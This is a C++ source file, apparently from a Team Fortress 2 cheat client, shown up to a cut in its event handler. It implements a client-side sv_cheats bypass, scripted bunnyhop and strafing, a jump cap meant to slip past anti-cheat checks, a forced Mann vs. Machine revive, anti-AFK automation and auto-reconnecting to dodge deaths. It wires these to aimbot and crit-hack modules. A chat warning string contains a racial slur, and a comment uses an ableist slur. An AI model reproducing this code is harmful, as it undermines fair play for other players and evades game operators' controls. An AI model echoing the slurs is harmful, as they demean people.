#include "Misc.h"

#include "../../Core/Core.h"
#include "../Backtrack/Backtrack.h"
#include "../Ticks/Ticks.h"
#include "../Players/PlayerUtils.h"
#include "../Aimbot/AutoRocketJump/AutoRocketJump.h"
#include "../Aimbot/AutoHeal/AutoHeal.h"
#include "../Aimbot/AimbotGlobal/AimbotGlobal.h"
#include "../Aimbot/AimbotProjectile/AimbotProjectile.h"
#include "../Simulation/ProjectileSimulation/ProjectileSimulation.h"
#include "../CritHack/CritHack.h"
#include "AntiAutobalance/AntiAutobalance.h"

void CMisc::RunPre(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	//AutoRetry(pLocal);
	CheatsBypass();
	WeaponSway();
	AntiAFK(pLocal, pCmd);
	InstantRespawnMVM(pLocal);
	NoisemakerSpam(pLocal);

	if (!pLocal->IsAlive() || pLocal->IsAGhost() || pLocal->m_MoveType() != MOVETYPE_WALK || pLocal->IsSwimming() 
		|| pLocal->IsTaunting() || pLocal->InCond(TF_COND_SHIELD_CHARGE))
		return;
	
	AutoJump(pLocal, pCmd);
	EdgeJump(pLocal, pCmd);
	if (pLocal->InCond(TF_COND_HALLOWEEN_KART))
		return;

	AutoJumpbug(pLocal, pCmd);
	AutoStrafe(pLocal, pCmd);
	AutoPeek(pLocal, pCmd);
	MovementLock(pLocal, pCmd);
	BreakJump(pLocal, pCmd);
}

void CMisc::RunPost(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (pLocal->IsTaunting() || pLocal->InCond(TF_COND_HALLOWEEN_KART))
		TauntKartControl(pLocal, pCmd);
	else
	{
		EdgeJump(pLocal, pCmd, true);
		AutoPeek(pLocal, pCmd, true);
		FastMovement(pLocal, pCmd);
	}

	//AutobalanceWarning(pLocal);
}

static bool IsCompetitiveMode()
{
	const IMatchGroupDescription* pMatchDesc = I::TFGameRules()->GetMatchGroupDescription();
	if (pMatchDesc)
		return pMatchDesc->m_eMatchType == MATCH_TYPE_COMPETITIVE || pMatchDesc->m_eMatchType == MATCH_TYPE_CASUAL;

	return false;
}

static inline TF_GC_TEAM GetGCTeamForGameTeam(int nGameTeam)
{
	const auto pGameRules = I::TFGameRules();
	if (!pGameRules)
		return TF_GC_TEAM_NOTEAM;

	if (nGameTeam == TF_TEAM_BLUE)
		return IsCompetitiveMode() && pGameRules->m_bTeamsSwitched() ? TF_GC_TEAM_DEFENDERS : TF_GC_TEAM_INVADERS;
	else if (nGameTeam == TF_TEAM_RED)
		return IsCompetitiveMode() && pGameRules->m_bTeamsSwitched() ? TF_GC_TEAM_INVADERS : TF_GC_TEAM_DEFENDERS;

	return TF_GC_TEAM_NOTEAM;
}

void CMisc::AutobalanceWarning(CTFPlayer* pLocal)
{
	if (!Vars::Debug::Options.Value)
		return;

	if (!F::AntiAutobalance.ShouldBeActive())
	{
		F::AntiAutobalance.Reset();
		return;
	}

	static bool bShouldWarn = false;
	static bool bOldUnbalanced = false;

	bool bUnbalanced = F::AntiAutobalance.AreTeamsUnbalanced();
	if (bUnbalanced && !bOldUnbalanced)
		bShouldWarn = true;
	bOldUnbalanced = bUnbalanced;
		
	if (!bUnbalanced)
	{
		bShouldWarn = false;
		return;
	}

	if (bShouldWarn)
	{
		auto pResource = H::Entities.GetResource();
		if (!pResource)
			return;

		auto FindCandidates = [&]()
			{
				std::vector<std::pair<int, double>>	vCandidates;

				auto pLobby = I::TFGCClientSystem->GetLobby();
				if (!pLobby)
					return vCandidates;

				int iMembers = pLobby->GetNumMembers();

				struct Player_t
				{
					uint32 m_uAccountID;
					double m_flRating;
				};

				std::vector<Player_t> lobbyPlayers;
				lobbyPlayers.reserve(iMembers);

				for (int i = 0; i < iMembers; i++)
				{
					ConstTFLobbyPlayer details;
					pLobby->GetMemberDetails(&details, i);

					auto pProto = details.Proto();
					if (!pProto)
						continue;

					lobbyPlayers.push_back({ uint32(pProto->id - 76561197960265728), pProto->normalized_rating });
				}

				for (int i = 1; i <= I::EngineClient->GetMaxClients(); i++)
				{
					if (!pResource->m_bConnected(i))
						continue;

					player_info_t tInfo{};
					if (!I::EngineClient->GetPlayerInfo(i, &tInfo))
						continue;

					for (const auto& pPlayer : lobbyPlayers)
					{
						if (pPlayer.m_uAccountID == tInfo.friendsID)
						{
							vCandidates.emplace_back(i, pPlayer.m_flRating);
							break;
						}
					}
				}

				std::sort(vCandidates.begin(), vCandidates.end(),
					[](const auto& a, const auto& b)
					{
						return a.second > b.second;
					});

				return vCandidates;
			};

		auto vCandidates = FindCandidates();
		if ((int)vCandidates.size() == 1)
		{
			int iIndex = vCandidates[0].first;

			SDK::Output("Autobalance Warning", std::format("niggaz about to get autobalanced: {}",
				pResource->GetName(iIndex)).c_str(),
				Vars::Menu::Theme::Accent.Value, OUTPUT_CHAT | OUTPUT_CONSOLE);
		}
		else if(!vCandidates.empty())
		{
			int iIndexFirst = vCandidates[0].first;
			int iIndexSecond = vCandidates[1].first;

			SDK::Output("Autobalance Warning", std::format("niggaz about to get autobalanced: {} and {}",
				pResource->GetName(iIndexFirst), pResource->GetName(iIndexSecond)).c_str(),
				Vars::Menu::Theme::Accent.Value, OUTPUT_CHAT | OUTPUT_CONSOLE);
		}

		bShouldWarn = false;
	}
}

void CMisc::AutoJump(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (!Vars::Misc::Movement::Bunnyhop.Value)
		return;

	if (auto pWeapon = H::Entities.GetWeapon(); pWeapon && pWeapon->GetWeaponID() == TF_WEAPON_GRAPPLINGHOOK && pWeapon->As<CTFGrapplingHook>()->m_hProjectile())
		return;

	static bool bStaticJump = false, bStaticGrounded = false, bLastAttempted = false;
	const bool bLastJump = bStaticJump, bLastGrounded = bStaticGrounded;
	const bool bCurJump = bStaticJump = pCmd->buttons & IN_JUMP, bCurGrounded = bStaticGrounded = pLocal->m_hGroundEntity();

	if (bCurJump && bLastJump && (bCurGrounded ? !pLocal->IsDucking() : true))
	{
		if (!(bCurGrounded && !bLastGrounded))
			pCmd->buttons &= ~IN_JUMP;

		if (!(pCmd->buttons & IN_JUMP) && bCurGrounded && !bLastAttempted)
			pCmd->buttons |= IN_JUMP;
	}

	if (Vars::Misc::Game::AntiCheatCompatibility.Value)
	{	// prevent more than 9 bhops occurring. if a server has this under that threshold they're retarded anyways
		static int iJumps = 0;
		if (bCurGrounded)
		{
			if (!bLastGrounded && pCmd->buttons & IN_JUMP)
				iJumps++;
			else
				iJumps = 0;

			if (iJumps > 9)
				pCmd->buttons &= ~IN_JUMP;
		}
	}
	bLastAttempted = pCmd->buttons & IN_JUMP;
}

void CMisc::AutoJumpbug(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (!Vars::Misc::Movement::AutoJumpbug.Value || !(pCmd->buttons & IN_DUCK) || pLocal->m_hGroundEntity() || pLocal->m_vecVelocity().z > -650.f)
		return;

	float flUnduckHeight = 20 * pLocal->m_flModelScale();
	float flTraceDistance = flUnduckHeight + 2;

	CGameTrace trace = {};
	CTraceFilterWorldAndPropsOnly filter = {};

	Vec3 vOrigin = pLocal->m_vecOrigin();
	SDK::TraceHull(vOrigin, vOrigin - Vec3(0, 0, flTraceDistance), pLocal->m_vecMins(), pLocal->m_vecMaxs(), pLocal->SolidMask(), &filter, &trace);
	if (!trace.DidHit() || trace.fraction * flTraceDistance < flUnduckHeight) // don't try if we aren't in range to unduck or are too low
		return;

	pCmd->buttons &= ~IN_DUCK;
	pCmd->buttons |= IN_JUMP;
}

void CMisc::AutoStrafe(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (!Vars::Misc::Movement::AutoStrafe.Value || pLocal->m_hGroundEntity() || !(pLocal->m_afButtonLast() & IN_JUMP) && (pCmd->buttons & IN_JUMP))
		return;

	switch (Vars::Misc::Movement::AutoStrafe.Value)
	{
	case Vars::Misc::Movement::AutoStrafeEnum::Legit:
	{
		static auto cl_sidespeed = U::ConVars.FindVar("cl_sidespeed");
		const float flSideSpeed = cl_sidespeed->GetFloat();

		if (pCmd->mousedx)
		{
			pCmd->forwardmove = 0.f;
			pCmd->sidemove = pCmd->mousedx > 0 ? flSideSpeed : -flSideSpeed;
		}
		break;
	}
	case Vars::Misc::Movement::AutoStrafeEnum::Directional:
	{
		// credits: KGB
		if (!(pCmd->buttons & (IN_FORWARD | IN_BACK | IN_MOVELEFT | IN_MOVERIGHT)))
			break;

		float flForward = pCmd->forwardmove, flSide = pCmd->sidemove;

		Vec3 vForward, vRight; Math::AngleVectors(pCmd->viewangles, &vForward, &vRight, nullptr);
		vForward.Normalize2D(), vRight.Normalize2D();

		Vec3 vWishDir = Math::VectorAngles({ vForward.x * flForward + vRight.x * flSide, vForward.y * flForward + vRight.y * flSide, 0.f });
		Vec3 vCurDir = Math::VectorAngles(pLocal->m_vecVelocity());
		float flDirDelta = Math::NormalizeAngle(vWishDir.y - vCurDir.y);
		if (fabsf(flDirDelta) > Vars::Misc::Movement::AutoStrafeMaxDelta.Value)
			break;

		float flTurnScale = Math::RemapVal(Vars::Misc::Movement::AutoStrafeTurnScale.Value, 0.f, 1.f, 0.9f, 1.f);
		float flRotation = DEG2RAD((flDirDelta > 0.f ? -90.f : 90.f) + flDirDelta * flTurnScale);
		float flCosRot = cosf(flRotation), flSinRot = sinf(flRotation);

		pCmd->forwardmove = flCosRot * flForward - flSinRot * flSide;
		pCmd->sidemove = flSinRot * flForward + flCosRot * flSide;
	}
	}
}

void CMisc::MovementLock(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	static bool bLock = false;

	if (!Vars::Misc::Movement::MovementLock.Value)
	{
		bLock = false;
		return;
	}

	static Vec3 vMove = {}, vView = {};
	if (!bLock)
	{
		bLock = true;
		vMove = { pCmd->forwardmove, pCmd->sidemove, pCmd->upmove };
		vView = pCmd->viewangles;
	}

	pCmd->forwardmove = vMove.x, pCmd->sidemove = vMove.y, pCmd->upmove = vMove.z;
	SDK::FixMovement(pCmd, vView, pCmd->viewangles);
}

void CMisc::BreakJump(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (!Vars::Misc::Movement::BreakJump.Value || F::AutoRocketJump.IsRunning())
		return;

	static bool bStaticJump = false;
	const bool bLastJump = bStaticJump;
	const bool bCurrJump = bStaticJump = pCmd->buttons & IN_JUMP;

	static int iTickSinceGrounded = -1;
	if (pLocal->m_hGroundEntity().Get())
		iTickSinceGrounded = -1;
	iTickSinceGrounded++;

	switch (iTickSinceGrounded)
	{
	case 0:
		if (bLastJump || !bCurrJump || pLocal->IsDucking())
			return;
		break;
	case 1:
		break;
	default:
		return;
	}

	pCmd->buttons |= IN_DUCK;
}

void CMisc::AntiAFK(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	static Timer tTimer = {};

	if (pCmd->buttons & (IN_FORWARD | IN_BACK | IN_MOVELEFT | IN_MOVERIGHT))
		tTimer.Update();
	else if (Vars::Misc::Automation::AntiAFK.Value && tTimer.Run(40.f))
	{
		if (!pLocal->IsAlive() || pLocal->m_iTeamNum() == TEAM_SPECTATOR || pLocal->m_iTeamNum() == TF_TEAM_AUTOASSIGN)
			I::EngineClient->ClientCmd_Unrestricted("join_class random");
		else
			pCmd->buttons |= IN_FORWARD;
	}
}

void CMisc::InstantRespawnMVM(CTFPlayer* pLocal)
{
	if (!Vars::Misc::MannVsMachine::InstantRespawn.Value || pLocal->IsAlive())
		return;

	KeyValues* kv = new KeyValues("MVM_Revive_Response");
	kv->SetBool("accepted", true);
	I::EngineClient->ServerCmdKeyValues(kv);
}

void CMisc::CheatsBypass()
{
	static bool bCheatSet = false;
	static auto sv_cheats = U::ConVars.FindVar("sv_cheats");
	if (Vars::Misc::Exploits::CheatsBypass.Value)
	{
		sv_cheats->m_nValue = 1;
		bCheatSet = true;
	}
	else if (bCheatSet)
	{
		sv_cheats->m_nValue = 0;
		bCheatSet = false;
	}
}

void CMisc::WeaponSway()
{
	static auto cl_wpn_sway_interp = U::ConVars.FindVar("cl_wpn_sway_interp");
	static auto cl_wpn_sway_scale = U::ConVars.FindVar("cl_wpn_sway_scale");

	bool bSway = Vars::Visuals::Viewmodel::SwayInterp.Value || Vars::Visuals::Viewmodel::SwayScale.Value;
	cl_wpn_sway_interp->SetValue(bSway ? Vars::Visuals::Viewmodel::SwayInterp.Value : 0.f);
	cl_wpn_sway_scale->SetValue(bSway ? Vars::Visuals::Viewmodel::SwayScale.Value : 0.f);
}



void CMisc::TauntKartControl(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (Vars::Misc::Automation::TauntControl.Value && pLocal->IsTaunting() && pLocal->m_bAllowMoveDuringTaunt())
	{
		if (pLocal->m_bTauntForceMoveForward())
		{
			if (pCmd->buttons & IN_BACK)
				pCmd->viewangles.x = 91.f;
			else if (!(pCmd->buttons & IN_FORWARD))
				pCmd->viewangles.x = 90.f;
		}
		if (pCmd->buttons & IN_MOVELEFT)
			pCmd->sidemove = pCmd->viewangles.x == 90.f ? -450.f : -pLocal->m_flTauntForceMoveForwardSpeed();
		else if (pCmd->buttons & IN_MOVERIGHT)
			pCmd->sidemove = pCmd->viewangles.x == 90.f ? 450.f : pLocal->m_flTauntForceMoveForwardSpeed();
	}
	else if (Vars::Misc::Automation::KartControl.Value && pLocal->InCond(TF_COND_HALLOWEEN_KART))
	{
		bool bChoke = I::ClientState->chokedcommands < 3 && F::Ticks.CanChoke(true);
		float flForward = fabsf(pCmd->forwardmove), flSide = pCmd->sidemove * (!bChoke ? 0.f : pCmd->forwardmove < 0.f ? -1 : 1);

		Vec3 vForward, vRight; Math::AngleVectors(pCmd->viewangles, &vForward, &vRight, nullptr);
		vForward.Normalize2D(), vRight.Normalize2D();

		pCmd->viewangles.x = 90.f;
		G::SilentAngles = true;

		if (!(pCmd->buttons & (IN_FORWARD | IN_BACK | IN_MOVELEFT | IN_MOVERIGHT)))
			return;
		if (pCmd->forwardmove < 0.f)
			pCmd->viewangles.x = 91.f;
		else if (pCmd->forwardmove > 0.f || flSide)
			pCmd->viewangles.x = 10.f;
		pCmd->forwardmove = 0.f;

		if (!flForward && !flSide)
			return;

		pCmd->forwardmove = 450.f;
		if (flSide)
		{
			Vec3 vWishDir = Math::VectorAngles({ vForward.x * flForward + vRight.x * flSide, vForward.y * flForward + vRight.y * flSide, 0.f });
			pCmd->viewangles.y = vWishDir.y;
			G::PSilentAngles = true;
		}
	}
}

void CMisc::FastMovement(CTFPlayer* pLocal, CUserCmd* pCmd)
{
	if (!pLocal->m_hGroundEntity() || pLocal->InCond(TF_COND_HALLOWEEN_KART))
		return;

	const float flSpeed = pLocal->m_vecVelocity().Length2D();
	const int flMaxSpeed = std::min(pLocal->m_flMaxspeed() * 0.9f, 520.f) - 10.f;
	const int iRun = !pCmd->forwardmove && !pCmd->sidemove ? 0 : flSpeed < flMaxSpeed ? 1 : 2;

	switch (iRun)
	{
	case 0:
	{
		if (!Vars::Misc::Movement::FastStop.Value || !flSpeed)
			return;

		Vec3 vDirection = pLocal->m_vecVelocity().ToAngle();
		vDirection.y = pCmd->viewangles.y - vDirection.y;
		Vec3 vNegatedDirection = vDirection.FromAngle() * -flSpeed;
		pCmd->forwardmove = vNegatedDirection.x;
		pCmd->sidemove = vNegatedDirection.y;

		break;
	}
	case 1:
	{
		if ((pLocal->IsDucking() ? !Vars::Misc::Movement::CrouchSpeed.Value : !Vars::Misc::Movement::FastAccelerate.Value)
			|| Vars::Misc::Game::AntiCheatCompatibility.Value
			|| G::Attacking == 1 || F::Ticks.m_bDoubletap || F::Ticks.m_bSpeedhack || F::Ticks.m_bRecharge || G::AntiAim)
			return;

		if (!(pCmd->buttons & (IN_FORWARD | IN_BACK | IN_MOVELEFT | IN_MOVERIGHT)))
			return;

		bool bChoke = !I::ClientState->chokedcommands && F::Ticks.CanChoke(true);
		if (!bChoke)
			return;

		Vec3 vMove = { pCmd->forwardmove, pCmd->sidemove, 0.f };
		Vec3 vAngMoveReverse = Math::VectorAngles(vMove * -1.f);
		pCmd->forwardmove = -vMove.Length();
		pCmd->sidemove = 0.f;
		pCmd->viewangles.y = fmodf(pCmd->viewangles.y - vAngMoveReverse.y, 360.f);
		pCmd->viewangles.z = 270.f;
		G::PSilentAngles = true;

		break;
	}
	}
}

void CMisc::AutoPeek(CTFPlayer* pLocal, CUserCmd* pCmd, bool bPost)
{
	static bool bReturning = false;

	if (!bPost)
	{
		if (Vars::AutoPeek::Enabled.Value)
		{
			Vec3 vLocalPos = pLocal->m_vecOrigin();

			if (bReturning)
			{
				if (vLocalPos.DistTo2D(m_vPeekReturnPos) < 8.f)
				{
					bReturning = false;
					return;
				}

				SDK::WalkTo(pCmd, pLocal, m_vPeekReturnPos);
				pCmd->buttons &= ~IN_JUMP;
			}
			else if (!pLocal->m_hGroundEntity())
				m_bPeekPlaced = false;

			if (!m_bPeekPlaced)
			{
				m_vPeekReturnPos = vLocalPos;
				m_bPeekPlaced = true;
			}
			else
			{
				static Timer tTimer = {};
				if (tTimer.Run(0.7f))
					H::Particles.DispatchParticleEffect("ping_circle", m_vPeekReturnPos, {});
			}
		}
		else
			m_bPeekPlaced = bReturning = false;
	}
	else if (G::Attacking && m_bPeekPlaced)
		bReturning = true;
}

void CMisc::EdgeJump(CTFPlayer* pLocal, CUserCmd* pCmd, bool bPost)
{
	if (!Vars::Misc::Movement::EdgeJump.Value)
		return;

	static bool bStaticGround = false;
	if (!bPost)
		bStaticGround = pLocal->m_hGroundEntity();
	else if (bStaticGround && !pLocal->m_hGroundEntity())
		pCmd->buttons |= IN_JUMP;
}

static inline float CalculateFalloff(CBaseEntity* pProjectile, CTFWeaponBase* pWeapon, CTFPlayer* pOwner, float flRadius, float flDamage)
{
	// CTFRadiusDamageInfo::CalculateFalloff
	float flFalloff = 0;
	int nDamageType = pWeapon->GetDamageType();
	if (nDamageType & DMG_RADIUS_MAX)
		flFalloff = 0.f;
	else if (nDamageType & DMG_HALF_FALLOFF)
		flFalloff = 0.5f;
	else if (flRadius)
		flFalloff = flDamage / flRadius;
	else
		flFalloff = 1.f;

	if (pWeapon)
	{
		float flFalloffMod = SDK::AttribHookValue(1.f, "mult_dmg_falloff", pWeapon);
		if (flFalloffMod != 1.f)
			flFalloff += flFalloffMod;
	}

	if (I::TFGameRules()->m_bPowerupMode())
	{
		if (pOwner->InCond(TF_COND_RUNE_PRECISION) && !pOwner->InCond(TF_COND_POWERUPMODE_DOMINANT))
			flFalloff = 1.0;
	}
	return flFalloff;
}

static inline float CalculateDamage(CBaseEntity* pProjectile, float flRadius, float flDamage, CTFPlayer* pOwner, Vec3 vProjectileOrigin, CBaseEntity* pTarget)
{
	// CTFRadiusDamageInfo::ApplyToEntity
	float flDistanceToEntity;
	{
		float flToWorldSpaceCenter = (vProjectileOrigin - pTarget->GetCenter()).Length();
		float flToOrigin = (vProjectileOrigin - pTarget->GetAbsOrigin()).Length();

		flDistanceToEntity = std::min(flToWorldSpaceCenter, flToOrigin);
	}
	const auto pWeapon = pOwner->m_hActiveWeapon()->As<CTFWeaponBase>();
	return Math::RemapVal(flDistanceToEntity, 0, flRadius, flDamage, flDamage * CalculateFalloff(pProjectile, pWeapon, pOwner, flRadius, flDamage));
}

static inline int GetShotsWithinTime(int iWeaponID, float flFireRate, float flTime)
{
	int iTicks = TIME_TO_TICKS(flTime);

	int iDelay = 1;
	switch (iWeaponID)
	{
	case TF_WEAPON_MINIGUN:
	case TF_WEAPON_PIPEBOMBLAUNCHER:
	case TF_WEAPON_CANNON:
		iDelay = 2;
	}

	return 1 + (iTicks - iDelay) / std::ceilf(flFireRate / TICK_INTERVAL);
}

void CMisc::AutoRetry(CTFPlayer* pLocal)
{
	if (!pLocal || pLocal 
		&& (!pLocal->IsAlive() || pLocal->IsAGhost() || pLocal->IsInvulnerable() || pLocal->InCond(TF_COND_PREVENT_DEATH)))
		return;

	// dont run if we have uber
	const auto pLocalWeapon = H::Entities.GetWeapon();
	if (pLocalWeapon)
	{
		if (pLocalWeapon->GetClassID() == ETFClassID::CWeaponMedigun
			&& pLocalWeapon->As<CWeaponMedigun>()->m_flChargeLevel() == 1.f)
			return;

		if (pLocalWeapon->m_iItemDefinitionIndex() == Medic_s_TheVaccinator
			&& pLocalWeapon->As<CWeaponMedigun>()->m_flChargeLevel() >= 0.25f)
			return;
	}

	// is it dangerous enough to retry?
	bool bShouldRetry = false;
	if((pLocal->InCond(TF_COND_BURNING) || pLocal->InCond(TF_COND_BURNING_PYRO)
		&& pLocal->m_iHealth() < 10))
		bShouldRetry = true;

	Vec3 vLocalOrigin = SDK::PredictOrigin(pLocal->m_vecOrigin(), pLocal->m_vecVelocity(), 0.f, true, pLocal->m_vecMins(), pLocal->m_vecMaxs(), pLocal->SolidMask());
	Vec3 vLocalCenter = vLocalOrigin + pLocal->GetOffset() / 2;
	Vec3 vLocalEye = vLocalOrigin + pLocal->GetViewOffset();

	float flLatency = F::Backtrack.GetReal();

	if (!bShouldRetry)
	{
		for (auto& pEntity : H::Entities.GetGroup(EntityEnum::PlayerEnemy))
		{
			const auto pPlayer = pEntity->As<CTFPlayer>();
			int iIndex = pPlayer->entindex();

			auto pWeapon = pPlayer->m_hActiveWeapon()->As<CTFWeaponBase>();
			if (!pWeapon || !pPlayer->CanAttack(true, false))
				continue;

			Vec3 vPlayerOrigin = SDK::PredictOrigin(pPlayer->m_vecOrigin(), pPlayer->m_vecVelocity(), flLatency, true, pPlayer->m_vecMins(), pPlayer->m_vecMaxs(), pPlayer->SolidMask());
			Vec3 vPlayerEye = vPlayerOrigin + pPlayer->GetViewOffset();

			bool bCheater = F::PlayerUtils.HasTag(iIndex, F::PlayerUtils.TagToIndex(CHEATER_TAG));
			bool bZoom = pPlayer->InCond(TF_COND_ZOOMED);
			float flFOV = Math::CalcFov(H::Entities.GetEyeAngles(iIndex) + H::Entities.GetDeltaAngles(iIndex), Math::CalcAngle(vPlayerEye, bZoom ? vLocalEye : vLocalCenter));
			bool bFOV = bCheater || flFOV < (bZoom ? 10 : SDK::GetWeaponType(pWeapon) == EWeaponType::HITSCAN ? 30 : 90);
			if (!bFOV || !F::AutoHeal.TraceToEntity(pLocal, pPlayer, vLocalCenter, vPlayerEye))
				continue;

			bool bCanCrit = F::CritHack.WeaponCanCrit(pWeapon);
			bool bCrits = pPlayer->IsCritBoosted() || bCanCrit;
			bool bMinicrits = pPlayer->IsMiniCritBoosted() || pLocal->IsMarked();
			float flDamage = pWeapon->GetDamage(), flMult = bCrits ? 3.f : bMinicrits ? 1.36f : 1.f;
			if (SDK::GetWeaponType(pWeapon) == EWeaponType::MELEE)
			{
				if (vLocalOrigin.DistTo(pPlayer->m_vecOrigin()) <= pWeapon->GetSwingRange()
					&& pLocal->m_iHealth() <= flDamage * flMult)
				{
					bShouldRetry = true;
					break;
				}
			}

			int nWeaponID = pWeapon->GetWeaponID();
			float flFireRate = std::min(pWeapon->GetFireRate(), 1.f);
			int iBulletCount = pWeapon->GetBulletsPerShot();
			int iShotsWithinTime = GetShotsWithinTime(nWeaponID, flFireRate, flLatency + TICKS_TO_TIME(bCheater ? 22 : 0));
			float flDistance = vPlayerEye.DistTo(vLocalCenter);
			switch (nWeaponID)
			{
			case TF_WEAPON_SNIPERRIFLE:
			case TF_WEAPON_SNIPERRIFLE_DECAP:
			case TF_WEAPON_SNIPERRIFLE_CLASSIC:
			{
				bool bClassic = nWeaponID == TF_WEAPON_SNIPERRIFLE_CLASSIC;
				bool bHeadshot = pWeapon->As<CTFSniperRifle>()->GetRifleType() != RIFLE_JARATE;
				bool bPiss = SDK::AttribHookValue(0, "jarate_duration", pWeapon) > 0;
				auto GetSniperDot = [](CBaseEntity* pEntity) -> CSniperDot*
					{
						for (auto pDot : H::Entities.GetGroup(EntityEnum::SniperDots))
						{
							if (pDot->m_hOwnerEntity().Get() == pEntity)
								return pDot->As<CSniperDot>();
						}
						return nullptr;
					};
				if (CSniperDot* pPlayerDot = GetSniperDot(pEntity))
				{
					float flChargeTime = std::max(SDK::AttribHookValue(3.f, "mult_sniper_charge_per_sec", pWeapon), 1.5f);
					flDamage = Math::RemapVal(TICKS_TO_TIME(I::ClientState->m_ClockDriftMgr.m_nServerTick) - pPlayerDot->m_flChargeStartTime() - 0.3f, 0.f, flChargeTime, 50.f, 150.f);
					if (bClassic && flDamage != 150.f)
						flDamage = SDK::AttribHookValue(flDamage, "bodyshot_damage_modify", pWeapon);
					break;
				}
				if (SDK::AttribHookValue(0, "sniper_only_fire_zoomed", pWeapon) && !bZoom)
					flDamage = 0.f;
				else if (bClassic || !bZoom)
					flDamage = SDK::AttribHookValue(50.f, "bodyshot_damage_modify", pWeapon);
				else
					flDamage = 150.f;
				break;
			}
			case TF_WEAPON_COMPOUND_BOW:
				flDamage = 120.f;
				break;
			case TF_WEAPON_FLAMETHROWER:
				flDamage = 80.f * flFireRate;
				break;
			default:
				flDamage = pWeapon->GetDamage(false);
			}

			switch (SDK::GetWeaponType(pWeapon))
			{
			case EWeaponType::HITSCAN:
			{
				flDamage *= flMult * (pWeapon ? SDK::AttribHookValue(1, "mult_dmg", pWeapon) : 1);

				float flSpread = std::clamp(pWeapon->GetWeaponSpread(), 0.001f, 1.f);
				float flMappedCount = Math::RemapVal(flDistance, 20 / flSpread, 100 / flSpread, iBulletCount, 1);
				float flDamageInLatency = flDamage * flMappedCount * iShotsWithinTime;
				float flDamageDanger = flDamageInLatency / pLocal->m_iHealth();
				float flDistanceDanger = Math::RemapVal(flDistance, 100, 100 / flSpread, 1.f, 0.001f);
				if (bCheater) // may use seed pred +/ crits
					flDistanceDanger = std::max(flDistanceDanger, bCrits ? 1.f : 0.34f);

				if (flDamageDanger * flDistanceDanger > 1.f && pLocal->m_iHealth() <= flDamage)
					bShouldRetry = true;
				break;
			}
			case EWeaponType::PROJECTILE:
			{
				ProjectileInfo tProjInfo = {};
				if (!F::ProjSim.GetInfo(pPlayer, pWeapon, {}, tProjInfo, ProjSimEnum::NoRandomAngles | ProjSimEnum::MaxSpeed))
					continue;

				flDamage *= flMult * (pWeapon ? SDK::AttribHookValue(1, "mult_dmg", pWeapon) : 1);

				float flRadius = tProjInfo.m_flVelocity * flLatency + F::AimbotProjectile.GetSplashRadius(pWeapon, pPlayer) + pLocal->GetSize().Length() / 2;
				float flDamageInLatency = flDamage * iBulletCount * iShotsWithinTime;
				float flDamageDanger = flDamageInLatency / pLocal->m_iHealth();
				float flDistanceDanger = Math::RemapVal(flDistance, flRadius, flRadius, 1.f, 0.001f);

				if (flDamageDanger * flDistanceDanger > 1.f && pLocal->m_iHealth() <= flDamage)
					bShouldRetry = true;
			}
			}

			if (bShouldRetry)
				break;
		}
	}

	if (!bShouldRetry)
	{
		for (auto pEntity : H::Entities.GetGroup(EntityEnum::WorldProjectile))
		{
			CTFPlayer* pOwner = nullptr;
			CTFWeaponBase* pWeapon = nullptr;

			switch (pEntity->GetClassID())
			{
			case ETFClassID::CTFGrenadePipebombProjectile:
			case ETFClassID::CTFWeaponBaseMerasmusGrenade:
			case ETFClassID::CTFProjectile_SpellMeteorShower:
				pWeapon = pEntity->As<CTFGrenadePipebombProjectile>()->m_hOriginalLauncher()->As<CTFWeaponBase>();
				pOwner = pEntity->As<CTFWeaponBaseGrenadeProj>()->m_hThrower()->As<CTFPlayer>();
				break;
			case ETFClassID::CTFProjectile_Arrow:
			case ETFClassID::CTFProjectile_HealingBolt:
			case ETFClassID::CTFProjectile_Rocket:
			case ETFClassID::CTFProjectile_SentryRocket:
			case ETFClassID::CTFProjectile_BallOfFire:
			case ETFClassID::CTFProjectile_SpellFireball:
			case ETFClassID::CTFProjectile_SpellLightningOrb:
			case ETFClassID::CTFProjectile_EnergyBall:
			case ETFClassID::CTFProjectile_Flare:
				pWeapon = pEntity->As<CTFBaseRocket>()->m_hLauncher()->As<CTFWeaponBase>();
				pOwner = pWeapon ? pWeapon->m_hOwner()->As<CTFPlayer>() : nullptr;
				break;
			case ETFClassID::CTFProjectile_EnergyRing:
				pWeapon = pEntity->As<CTFBaseProjectile>()->m_hLauncher()->As<CTFWeaponBase>();
				pOwner = pWeapon ? pWeapon->m_hOwner()->As<CTFPlayer>() : nullptr;
			}
			if (!pOwner
				|| (!F::AimbotGlobal.FriendlyFire() || pEntity->GetClassID() == ETFClassID::CTFProjectile_HealingBolt) && pOwner->m_iTeamNum() == pLocal->m_iTeamNum()
				|| pWeapon && !pWeapon->GetDamage())
				continue;

			Vec3 vVelocity = F::ProjSim.GetVelocity(pEntity);
			float flRadius = F::AimbotProjectile.GetSplashRadius(pEntity, pWeapon, pOwner);

			Vec3 vProjectileOrigin = SDK::PredictOrigin(pEntity->m_vecOrigin(), vVelocity, F::Backtrack.GetReal(), true, pEntity->m_vecMins(), pEntity->m_vecMaxs());
			if (!F::AutoHeal.TraceToEntity(pLocal, pEntity, vLocalEye, vProjectileOrigin, MASK_SHOT))
				continue;

			int iType = MEDIGUN_BLAST_RESIST;
			float flMult = F::AutoHeal.GetMult(pEntity, pWeapon, pLocal);
			float flDamage = F::AutoHeal.GetDamage(pEntity, pOwner, pWeapon, pLocal, flMult, vProjectileOrigin, &iType) * flMult;
			flDamage = CalculateDamage(pEntity, flRadius, flDamage, pOwner, vProjectileOrigin, pLocal);

			flRadius += vVelocity.Length() * flLatency + pLocal->GetSize().Length() / 2;
			float flDamageDanger = flDamage / pLocal->m_iHealth();
			float flDistanceDanger = Math::RemapVal(pLocal->m_vecOrigin().DistTo(vProjectileOrigin), flRadius, flRadius, 1.f, 0.001f);

			if (flDamageDanger * flDistanceDanger > 1.f && pLocal->m_iHealth() <= flDamage)
			{
				bShouldRetry = true;
				break;
			}
		}
	}

	if (bShouldRetry)
		I::EngineClient->ClientCmd_Unrestricted("retry");
}

void CMisc::Event(IGameEvent* pEvent, uint32_t uHash)
{
	switch (uHash)
	{
